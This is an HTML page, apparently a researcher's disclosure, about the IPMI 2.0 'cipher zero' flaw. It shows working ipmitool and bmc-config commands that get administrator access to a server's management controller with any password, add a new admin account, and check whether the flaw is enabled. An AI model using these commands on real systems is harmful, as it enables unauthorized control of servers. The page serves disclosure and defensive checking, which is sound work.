@@ -1,0 +1,277 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+	<title>The Infamous Cipher Zero</title>
+
+   <!-- from the marvelous http://1kbgrid.com/ -->
+	<link href="/ipmi/css/grid.css" type="text/css" rel="stylesheet" media="screen"/>
+	<style type="text/css" media="screen">
+		body { margin: 10px 0 0 0; }
+		p.grid {
+			font:60px/100px Helvetica;
+			color: #000;
+			text-align: center;
+			border: 1px solid #000;
+			margin: 0 0 10px 0;
+		}
+   </style>
+
+   <!-- http://designshack.net/articles/css/5-simple-and-practical-css-list-styles-you-can-copy-and-paste/ -->
+   <link rel="stylesheet" href="/ipmi/css/hmenu.css" type="text/css">
+   <!-- http://twistedintellect.com/ -->
+   <link rel="stylesheet" href="/ipmi/css/twisty.css" type="text/css">
+
+   <!-- http://pythoughts.com/table-style-css/ -->
+   <link rel="stylesheet" href="/ipmi/css/table.css" type="text/css">
+
+   <!-- additional style hacks because I don't know css -->
+   <style>
+      a:link {color:#00009D; text-decoration: underline; }
+      a:visited {color:#4682B4; text-decoration: underline; }
+
+      .stylish {
+         color: #424242;
+         font-family: "Adobe Caslon Pro", "Hoefler Text", Georgia, Garamond, Times, serif;
+         letter-spacing:0.1em;
+         text-transform: lowercase;
+         font-size: 10pt;
+         font-variant: small-caps;
+      }
+
+      .p_box          { border: 1px solid #000; padding: 5px; background-color: #E6E6CE;}
+      .grid_3_padded  { width:240px; padding-left: 40px; }
+      .grid_6_padded  { width:510px; padding-left: 20px; }
+      .grid_7_padded  { width:600px; padding-left: 20px; }
+      .grid_10_padded { width:870px; padding-left: 20px; }
+
+      /* http://demo.marcofolio.net/css_lists/ */
+      #listx { color:#000; }
+      #listx ol li ol { list-style-image: url("images/xnested.png"); padding:10px 0 10px 18px; font-size:15px; }
+      #listx ol li ol li { color:#000; height:20px; margin-left:15px; }
+
+      /* http://hellodirty.com/post/30281359285/how-can-i-add-a-background-image-to-masonite-theme-i */
+      body {
+         font-family: Georgia, "Times New Roman", Times, serif;
+         background-image: url(http://subtlepatterns.com/patterns/vintage_speckles.png);
+         background-repeat: repeat; /* no-repeat/repeat-x/repeat-y */
+         background-position: 0 0; /* 100%/300px/left/center/right 100%/300px/top/center/bottom */
+      }
+	</style>
+
+   <style type="text/css" media="screen">
+      .section {
+         background: #fff;
+         color: #333;
+         font: 80%/1.2 Courier;
+         border: 1px solid #C0C0C0;
+         padding: 10px 20px;
+         overflow: hidden;
+      }  
+   </style> 
+   
+</head>
+
+<body>
+<div class="row">
+	<div class="column grid_12">
+      <nav>
+         <ul style="list-style-type: none;">
+            <li class="active navi"><a href="/ipmi">IPMI</a></li>
+            <li class="navi">       <a href="http://trouble.org">trouble</a></li>
+            <li class="navi">       <a href="/security">security</a></li>
+         </ul>
+      </nav>
+   </div>
+</div>
+
+<div class="row">
+	<div class="column grid_3"> <p> </p></div>
+	<div class="column grid_9"><p class="grid styley">The Brain-Death in the IPMI Specification</p>
+</div>
+
+<div class="row">
+
+	<div class="column grid_2"> 
+      <p class="styley p_box">The Infamous Cipher 0</p>
+   </div>
+
+	<div class="column grid_10_padded">
+
+<p>
+
+It's hard to imagine someone thinking this up.  The IPMI 2.0 Specification
+introduced cryptography into IPMI.  Perhaps someone thought... well,
+cryptography is hard.  So let's put in a way to completely sidestep not
+only cryptography, but authentication as well.  This is the essence
+of cipher zero - it's really no cipher at all, or the un-cipher.
+It does require IPMI is turned on, as well as a valid account that can
+be authenticated to, you simply don't need the authentication. Vendors
+always have a default account, however, so that makes things a bit easier.
+
+<p>
+
+So let's see, to belabor the obvious, to execute an IPMI command, you
+can use good ol' bmc-config with the proper authentication:
+
+<div class="section">
+$ <strong>bmc-config -D LAN_2_0 -I 0  -v -u root -p calvin -h 10.0.0.1 --checkout|grep -i cipher_suite_id_0 </strong><br />
+Maximum_Privilege_Cipher_Suite_Id_0           Administrator<br />
+</div>
+
+<p>
+
+You know, that line of output is not good. How not good is "not good"? Well, let's try it again... this time with "FluffyWabbit" as the password:
+
+<p>
+<div class="section">
+$ <strong>bmc-config -D LAN_2_0 -I 0  -v -u root -p FluffyWabbit -h 10.0.0.1 --checkout|grep -i cipher_suite_id_0</strong><br />
+Maximum_Privilege_Cipher_Suite_Id_0           Administrator<br />
+</div>
+<p>
+
+I guess this is neat. Or sad.  Or something.  You can try other passwords
+to verify FluffyWabbit isn't some vendor hardcoded backdoor ;)
+
+<p>
+
+That said, so what?  What's the worst that can happen? Ok... well,
+let's try this on my Dell iDRAC. It has an account called root, and
+a password that we don't know. 
+
+<p>
+<div class="section">
+# this shouldn't work<br />
+$ <strong>ipmitool -H 10.0.0.1 -U root -P calvin chassis status</strong><br />
+Activate Session command failed<br />
+Error: Unable to establish LAN session<br />
+Error sending Get Self Test command<br />
+# this really shouldn't either, but does.<br />
+$ <strong>ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P FluffyWabbit chassis status</strong><br />
+</div>
+
+<p>
+
+Note you have to explicitly say you want version 2 (e.g. lanplus, in this case),
+as well as cipher zero ("-C 0".)
+
+<p>
+
+Still unimpressed, I know. Well, onwards.  Let's create an IPMI account,
+give it a password, administrator rights, and enable it. I'll use both
+ipmitool and bmc-config; the former is great for illustrating settings,
+while the latter is very simple to understand the output.
+
+<p>
+<div class="section">
+# one account is there now<br />
+<strong>ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list</strong><br />
+ID  Name      Callin  Link Auth  IPMI Msg   Channel Priv Limit<br />
+2   admin            true    true       true       ADMINISTRATOR<br />
+
+$ <strong>cat bozo.txt </strong><br />  
+# add a user with administrative rights<br />
+Section User9<br />
+   Username                                   bozo<br />
+   Password                                   theclown<br />
+   Enable_User                                Yes<br />
+   Lan_Enable_IPMI_Msgs                       Yes<br />
+   Lan_Enable_Link_Auth                       Yes<br />
+   Lan_Enable_Restricted_to_Callback          No<br />
+   Lan_Privilege_Limit                        Administrator<br />
+   SOL_Payload_Access                         Yes<br />
+   Serial_Enable_IPMI_Msgs                    Yes<br />
+   Serial_Enable_Link_Auth                    Yes<br />
+   Serial_Enable_Restricted_to_Callback       No<br />
+   Serial_Privilege_Limit                     Administrator<br />
+EndSection<br />
+# et tu, bmc-config?<br />
+$ <strong>bmc-config  -v -u root -p calvin -h 10.0.0.1 --commit -f bozo.txt</strong><br />
+# voila<br />  
+$<strong>ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list</strong><br />
+ID  Name      Callin  Link Auth  IPMI Msg   Channel Priv Limit<br />
+2   admin            true    true       true       ADMINISTRATOR<br />
+9   bozo             true    true       true       ADMINISTRATOR<br />
+# take the new account out for a test drive; no cheating with C0 this time<br />
+$<strong>ipmitool -H 10.0.0.1 -U bozo -P theclown user list</strong><br />
+ID  Name      Callin  Link Auth  IPMI Msg   Channel Priv Limit<br />
+2   admin            true    true       true       ADMINISTRATOR<br />
+9   bozo             true    true       true       ADMINISTRATOR<br />
+</div>
+
+<p>
+
+Since IPMI administrative access grants you god powers on the server,
+it's a bit problematic that it's so easy to get admin rights.
+
+<p>
+
+I believe that IBM, as of the M2/Nehalem generation, has essentially
+abolished cipher zero through the efforts of Jarred B Johnson (kudos
+to both!) Dell told me that it was no longer on by default in the most
+recent version of iDRAC.  I'm not sure who else still has this going on -
+but you might check your own boxes.  Drop me a line if you hear your
+vendor has this on or off by default.
+
+<p>
+<h4>Disclaimer</h4>
+
+Various versions of the IPMI utilities - including bmc-config -  do not
+work correctly with cipher 0 and will fail; this misled me early on in
+testing my own boxes. The latest version of freeipmi seems to work on
+all the ones I've tested, at least; make sure you have downloaded the
+latest copy and try this to verify good ol' cipher 0 is still around.
+
+Most commands say they support cipher zero, but ensure you have the
+latest version, because bugs abound out there in the tools and/or in
+the BMCs. Here's a couple of more ways to see if this is enabled:
+
+<p>
+<div class=section>
+   $ <strong>ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit lan print</strong><br />
+   $ <strong>ipmiutil lan  -J 0  -N 10.0.0.1 -U admin -P FluffyBunny</strong><br />
+</div>
+
+<p>
+Ipmiutil has a nice printing of the results - anything in the RMCP+
+line (in red below) looks zero-ish is bad :) Cipher Privs refers to the
+maximum privilege the account can have using a given cipher suite.
+<p>
+
+<div class=section>
+    $ <strong>ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P calvin  lan print</strong><br />
+     Set in Progress         : Set Complete<br />
+     Auth Type Support       : NONE MD2 MD5 PASSWORD<br />
+     Auth Type Enable        : Callback : MD2 MD5<br />
+                             : User     : MD2 MD5<br />
+                             : Operator : MD2 MD5<br />
+                             : Admin    : MD2 MD5<br />
+                             : OEM      :<br />
+     IP Address Source       : Static Address<br />
+     IP Address              : 10.0.0.1<br />
+     Subnet Mask             : 255.255.255.0<br />
+     MAC Address             : 14:fe:b5:c7:df:28<br />
+     SNMP Community String   : public<br />
+     IP Header               : TTL=0x40 Flags=0x40 Precedence=0x00 TOS=0x10<br />
+     Default Gateway IP      : 192.168.0.1<br />
+     Default Gateway MAC     : 00:00:00:00:00:00<br />
+     Backup Gateway IP       : 0.0.0.0<br />
+     Backup Gateway MAC      : 00:00:00:00:00:00<br />
+     802.1q VLAN ID          : Disabled<br />
+     802.1q VLAN Priority    : 0<br />
+     RMCP+ Cipher Suites     : <font color="red">0,1,2,3,4,5,6,7,8,9,10,11,12,13,14</font><br />
+     Cipher Suite Priv Max   : <font color="red">aaaaaaaaaaaaaaaa</font><br />
+                             :     X=Cipher Suite Unused<br />
+                             :     c=CALLBACK<br />
+                             :     u=USER<br />
+                             :     o=OPERATOR<br />
+                             :     a=ADMIN<br />
+                             :     O=OEM<br />
+</div>
+
+
+</div>
+
+</body>
+</html>
+
